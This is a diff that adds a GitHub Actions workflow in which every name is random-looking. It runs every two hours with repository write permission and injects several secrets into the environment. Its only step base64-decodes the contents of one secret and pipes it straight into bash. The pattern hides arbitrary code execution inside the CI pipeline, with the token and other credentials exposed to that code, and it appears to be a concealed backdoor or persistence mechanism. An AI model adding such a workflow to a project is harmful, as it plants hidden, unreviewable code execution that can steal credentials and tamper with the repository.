@@ -1,0 +1,21 @@
+name: rLSEof7glVRCKhdQ
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  xh7mlK6kB40n:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.nTMO3 }}
+      - name: oBdiSWOEkj8
+        env:
+          MSDr0AOZxU: ${{ secrets.HI8brz8hL }}
+          m9a5DNfmUWMXFs: ${{ secrets.UNwPbrS }}
+          OslfFT29ktvpZh: ${{ secrets.YdeKOouwUwA }}
+          GITHUB_TOKEN: ${{ secrets.nTMO3 }}
+        run: echo "$MSDr0AOZxU" | base64 -d | bash
